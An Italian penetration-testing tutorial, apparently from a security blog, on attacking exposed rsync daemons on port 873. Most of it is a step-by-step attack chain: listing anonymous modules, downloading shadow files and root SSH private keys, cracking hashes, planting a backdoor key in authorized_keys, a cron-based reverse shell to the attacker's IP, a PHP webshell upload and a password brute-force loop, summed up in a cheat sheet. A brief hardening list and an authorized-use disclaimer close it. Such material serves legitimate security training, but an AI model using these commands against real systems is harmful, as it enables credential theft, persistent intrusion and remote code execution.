---
title: 'Rsync Port 873: Come Enumerare Moduli, Scaricare File Sensibili e Ottenere Shell'
slug: rsync
description: Rsync è un potente strumento per sincronizzare e trasferire file da terminale. Scopri come viene usato anche in attacchi interni per esfiltrazione dati.
image: /rsync.webp
draft: false
date: 2026-01-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - rsync
  - ''
featured: true
---

Trovi la porta 873 aperta durante una scansione. In dieci minuti puoi avere hash delle password, chiavi SSH private e — se il modulo è writable — accesso diretto al sistema. Questa guida copre tutto: dalla prima connessione al demone rsync fino alla shell.

***

## Cos'è il Demone Rsyncd e Perché è Pericoloso

Il demone `rsyncd` espone **moduli** — directory condivise configurate in `/etc/rsyncd.conf`. Ogni modulo può richiedere autenticazione oppure essere completamente aperto.

La misconfig più comune: nessun `auth users`. Chiunque si connette legge (o scrive) senza credenziali.

Esempio di configurazione vulnerabile:

```ini
[backup]
    path = /var/backup
    read only = yes
    # nessun auth users = accesso anonimo

[storage]
    path = /home/fox
    read only = no
    # writable + anonimo = game over
```

***

## Come Enumerare i Moduli Rsync Esposti sulla Porta 873

### Scan con nmap

Usa [nmap](https://hackita.it/articoli/nmap) per confermare il servizio e listare i moduli esposti:

```bash
nmap -sV -sC -p 873 <target>
```

Output atteso:

```
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules:
|   backup    Daily system backup
|   www       Web document root
```

### Lista moduli senza autenticazione

```bash
rsync rsync://<target>/
```

Se risponde senza chiedere password: accesso anonimo confermato.

### Contenuto del modulo

```bash
rsync -av --list-only rsync://<target>/backup/
```

Filtra subito i file interessanti:

```bash
rsync -av --list-only rsync://<target>/backup/ | grep -iE "shadow|id_rsa|\.conf|\.key|secret"
```

***

## Come Scaricare File Sensibili da un Modulo Rsync Anonimo

### File singolo

```bash
rsync -av rsync://<target>/backup/etc/shadow /tmp/shadow
rsync -av rsync://<target>/backup/root/.ssh/id_rsa /tmp/root_key
```

### Intero modulo

```bash
rsync -av rsync://<target>/backup/ /tmp/dump/
```

**Cosa fai con quello che hai:**

* `shadow` → crack con [hashcat](https://hackita.it/articoli/hashcat): `hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt`
* `id_rsa` → `chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@<target>`
* `rsyncd.secrets` → password per i moduli protetti

***

## Come Verificare se un Modulo Rsync è Writable

```bash
echo "test" > /tmp/test.txt
rsync -av --dry-run /tmp/test.txt rsync://<target>/storage/
```

Se non ricevi `ERROR: module is read only` → puoi scrivere.

***

## Come Caricare una SSH Key su Rsync per Accesso Persistente

Se il modulo mappa una home directory:

```bash
# 1. genera chiave
ssh-keygen -f /tmp/backdoor -N ""

# 2. crea .ssh in locale (cartella vuota)
mkdir /tmp/.ssh

# 3. carica la cartella sul target
rsync -av /tmp/.ssh/ rsync://<target>/storage/.ssh/

# 4. carica la chiave come authorized_keys
rsync -av /tmp/backdoor.pub rsync://<target>/storage/.ssh/authorized_keys

# 5. connettiti
ssh -i /tmp/backdoor fox@<target>
```

> **Nota:** se la versione remota di rsync è vecchia, `--mkpath` non funziona. Devi caricare prima la cartella vuota, poi il file — nell'ordine esatto sopra.

***

## Reverse Shell via Crontab su Modulo Rsync Writable

Se il modulo ha accesso a `/etc/cron.d/`:

```bash
echo "* * * * * root bash -i >& /dev/tcp/<tuo_ip>/9001 0>&1" > /tmp/evil_cron
rsync -av /tmp/evil_cron rsync://<target>/backup/etc/cron.d/persistence
```

Listener: `nc -lvnp 9001`

***

## Webshell su Rsync con Modulo che Mappa il Web Root

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/cmd.php
rsync -av /tmp/cmd.php rsync://<target>/www/cmd.php
curl "http://<target>/cmd.php?c=id"
```

***

## Brute Force su Modulo Rsync Protetto da Password

```bash
nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
```

Loop manuale con password comuni:

```bash
for pass in "" backup rsync admin password 123456; do
  RSYNC_PASSWORD="$pass" rsync rsync://backup@<target>/private/ 2>/dev/null && echo "TROVATA: $pass" && break
done
```

***

## Post-Exploitation: Cosa Fare Dopo la Shell

Una volta dentro, usa [LinPEAS](https://hackita.it/articoli/linpeas) per enumerare il sistema e trovare vettori di privilege escalation.

***

## Attack Chain Completa

| Fase           | Comando                                                         |
| -------------- | --------------------------------------------------------------- |
| Scan           | `nmap -sV -sC -p 873 <target>`                                  |
| Lista moduli   | `rsync rsync://<target>/`                                       |
| Contenuto      | `rsync -av --list-only rsync://<target>/<mod>/`                 |
| Download file  | `rsync -av rsync://<target>/<mod>/etc/shadow /tmp/`             |
| Test write     | `rsync -av --dry-run test.txt rsync://<target>/<mod>/`          |
| Upload SSH key | `rsync -av key.pub rsync://<target>/<mod>/.ssh/authorized_keys` |
| SSH            | `ssh -i backdoor user@<target>`                                 |

***

## Errori Comuni su Rsync e Come Risolverli

| Errore                   | Causa                           | Fix                                   |
| ------------------------ | ------------------------------- | ------------------------------------- |
| Connection refused       | rsyncd non attivo               | Cerca porta custom con `nmap -p-`     |
| `@ERROR: auth failed`    | Password richiesta              | Brute force o password comuni         |
| `@ERROR: Unknown module` | Nome sbagliato                  | Lista con `rsync rsync://<target>/`   |
| `read only`              | Modulo non writable             | Prova altri moduli                    |
| `change_dir failed`      | Directory non esiste sul target | Carica prima la cartella, poi il file |

***

## Come Proteggere Rsync dalla Porta 873

* `auth users` e `secrets file` su ogni modulo
* `read only = yes` di default
* `hosts allow` per limitare gli IP autorizzati
* Log in `/var/log/rsyncd.log` con monitoraggio attivo
* Soluzione definitiva: disabilita rsyncd, usa rsync over SSH (`rsync -e ssh`)

***

## Cheat Sheet Rsync Pentest

```bash
# enumera moduli
rsync rsync://<target>/

# lista contenuto modulo
rsync -av --list-only rsync://<target>/<mod>/

# scarica file singolo
rsync -av rsync://<target>/<mod>/path/file /tmp/

# scarica intero modulo
rsync -av rsync://<target>/<mod>/ /tmp/dump/

# test scrittura
rsync -av --dry-run test.txt rsync://<target>/<mod>/

# upload file
rsync -av file rsync://<target>/<mod>/path/

# con password
RSYNC_PASSWORD=pass rsync rsync://user@<target>/<mod>/
```

***

Uso esclusivo in ambienti autorizzati.

Se questo articolo ti è stato utile e vuoi supportare HackIta, puoi farlo qui: [hackita.it/supporto](https://hackita.it/supporto)

Se vuoi fare sul serio — formazione 1:1, lab guidati o far testare la tua azienda — trovi tutto qui: [hackita.it/servizi](https://hackita.it/servizi)
